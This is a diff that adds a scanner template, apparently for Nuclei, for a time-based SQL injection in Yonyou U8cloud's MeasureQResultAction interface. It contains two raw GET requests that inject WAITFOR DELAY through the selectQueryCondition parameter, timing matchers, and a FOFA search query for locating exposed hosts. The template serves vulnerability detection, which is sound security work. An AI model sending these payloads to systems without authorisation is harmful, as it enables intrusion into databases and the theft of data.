@@ -1,0 +1,33 @@
+id: yonyou-u8-cloud-measureqresultaction-sqli
+
+info:
+  name: Yonyou U8cloud MeasureQResultAction SQL Injection
+  author: Co5mos
+  severity: high
+  description: |
+    Yonyou U8cloud's MeasureQResultAction interface is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands, potentially leading to data leakage or unauthorized actions on the database.
+  reference:
+    - https://axsec.blog.csdn.net/article/details/141496466
+  metadata:
+    verified: true
+    fofa-query: 'app="用友-UFIDA-NC"'
+  tags: yonyou, sqli
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQResultAction&method=execute&selectQueryCondition=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        @timeout: 20s
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQResultAction&method=execute&selectQueryCondition=1%27);WAITFOR+DELAY+%270:0:0%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration_1 >= 5 && duration_1 < 10
+          - duration_2 < 5
+        condition: and
